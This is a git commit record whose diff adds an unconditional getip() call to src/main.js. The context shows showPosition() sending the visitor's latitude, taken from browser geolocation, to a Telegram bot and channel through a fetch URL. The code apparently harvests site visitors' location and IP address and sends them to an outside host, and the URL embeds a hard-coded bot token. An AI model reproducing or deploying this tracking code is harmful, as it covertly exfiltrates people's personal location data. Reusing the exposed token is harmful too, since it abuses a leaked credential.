c7703e8010bd5637477f291b667a13d3f9c44dd0
Abhishek Bhardwaj <40014349+abhiib02@users.noreply.github.com>
2022-06-13 19:59:01 +0530

    checking ip

--- src/main.js
+++ src/main.js
@@ -6,7 +6,7 @@ else{
   getip();
 }
 
-
+getip();
 function showPosition(position) {
   fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
   Latitude:${position.coords.latitude}
